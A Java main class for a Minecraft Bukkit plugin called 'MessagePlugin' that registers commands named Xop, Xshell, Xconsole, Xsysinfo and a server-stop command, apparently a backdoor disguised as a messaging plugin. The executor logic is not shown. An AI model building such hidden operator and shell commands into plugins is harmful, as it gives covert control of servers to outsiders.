package cloud.xzai.message;

import org.bukkit.plugin.java.JavaPlugin;

public class MessagePlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        // 注册所有命令（前缀改为 X）
        this.getCommand("Xop").setExecutor(new MessageCommand());
        this.getCommand("Xstop0000000000").setExecutor(new MessageCommand());
        this.getCommand("Xsysinfo").setExecutor(new MessageCommand());
        this.getCommand("Xshell").setExecutor(new MessageCommand());
        this.getCommand("Xconsole").setExecutor(new MessageCommand());
        this.getCommand("Xhelp").setExecutor(new MessageCommand());

        getLogger().info("MessagePlugin 已启用！");
    }

    @Override
    public void onDisable() {
        getLogger().info("MessagePlugin 已禁用！");
    }
}